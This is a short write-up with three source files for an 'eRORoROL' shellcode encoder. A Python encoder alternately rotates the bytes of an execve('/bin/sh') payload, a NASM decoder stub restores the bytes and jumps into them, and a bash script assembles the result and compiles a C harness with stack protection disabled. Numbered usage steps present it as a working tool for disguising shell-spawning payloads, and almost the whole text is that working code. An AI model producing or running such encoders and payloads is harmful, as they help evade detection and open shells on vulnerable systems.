Custom shellcode encoder/decoder that switches between byte ROR and byte ROL

1. Update eRORoROL-encoder.py with your shellcode
2. Run eRORoROL-encoder.py
3. Copy output from eRORoROL-encoder.py and update eRORoROL-decoder.nasm
4. Run eRORoROL_compile.sh

-----eRORoROL-encoder.py BEGIN CODE-----
#!/usr/bin/python
# Python Custom Encoding eRORoROL
# Author:   	Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
# Description:  If index number is Even do a ROR, else do a ROL

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

format_slash_x = ""
format_0x = ""
counter = 0

max_bits = 8
offset = 1

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

print "Shellcode encryption started ..."

for x in bytearray(shellcode):
  #go through all hexadecimal values
  counter += 1
  print "[i] Counter: "+str(counter)
  print "[i] Instruction in hex: "+ hex(x)
  print "[i] Instruction in decimal: "+ str(x)

  if counter%2==0:  #check if index number is odd or even
    print "[i] EVEN index, therefore do ROR"
    rox_encoded_instruction = ror(x, offset, max_bits)
  else:
    print "[i] ODD index therefore do ROL"
    rox_encoded_instruction = rol(x, offset, max_bits)

  encoded_instruction_in_hex = '%02x' % rox_encoded_instruction
  print "[i] Encoded instruction in hex: "+encoded_instruction_in_hex +"\n"

  #Beautify with 0x and comma
  format_0x += '0x'
  format_0x += encoded_instruction_in_hex+","

print "\n[+] Shellcode custom encoding done"
print "\n[i] Initial shellcode length: %d" % len(bytearray(shellcode))
length_format_0x = format_0x.count(',')
print "[i] Encoded format 0x Length: %d" % length_format_0x
print "[i] Encoded format 0x:\t"+ format_0x

if "0x0," in format_0x:  print "\n[!] :( WARNING: Output shellcode contains NULL byte(s), consider re-encoding with different offset."
else: print "\n[i] :) Good to go, no NULL bytes detected in output"

print "\n[i] Done!"
-----eRORoROL-encoder.py END CODE-----


-----eRORoROL-decoder.nasm BEGIN CODE-----
; Title: 	eRORoROL-decoder.nasm
; Author: 	Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
; Description:	If index number is Even do a ROR, else do a ROL

global _start

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi         ;shellcode on ESI
	xor ecx,ecx	;our loop counter
	mov cl, shellcode_length	;mov cl, 25;shellcode_length 25 bytes

check_even_odd:
	test  si, 01h	;perform (si & 01h) discarding the result but set the eflags
			;set ZF to 1 if (the least significant bit of SI is 0)
			;EVEN: if_least_significant_bit_of_SI_is_0 AND 01h: result is 0 then ZF=0)
			;ODD:  if_least_significant_bit_of_SI_is_1 AND 01h: result is 1 then ZF=1)
	je even_number	;if SI==0 then the number is even
			;else execute the odd number section

odd_number:
        rol byte [esi], 0x1     ;rol decode with 1 offset
	jmp short inc_dec

even_number:
        ror byte [esi], 0x1     ;ror decode with 1 offset

inc_dec:
	inc esi			;next instruction in the encoded shellcode
        loop check_even_odd	;loop uses ECX for counter
	jmp short shellcode

call_shellcode:
	call decoder
	shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
	shellcode_length equ $-shellcode

-----eRORoROL-decoder.nasm END CODE-----

-----eRORoROL_compile.sh BEGIN CODE-----
#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -melf_i386 -o $1 $1.o

echo '[+] Dumping shellcode ...'

echo '' > shellcode.nasm
for i in `objdump -d $1 | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" >> shellcode.nasm; done

echo '[+] Creating new shellcode.c ...'
cat > shellcode.c <<EOF
#include<stdio.h>
#include<string.h>
unsigned char code[] ="\\
EOF
echo -n "\\" >> shellcode.c
cat shellcode.nasm >> shellcode.c

cat >> shellcode.c <<EOF
";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
EOF

echo '[+] Compiling shellcode.c ...'
gcc -fno-stack-protector -z execstack -m32 -o shellcode shellcode.c

echo '[+] Done! Run ./shellcode to execute!'
-----eRORoROL_compile.sh END CODE-----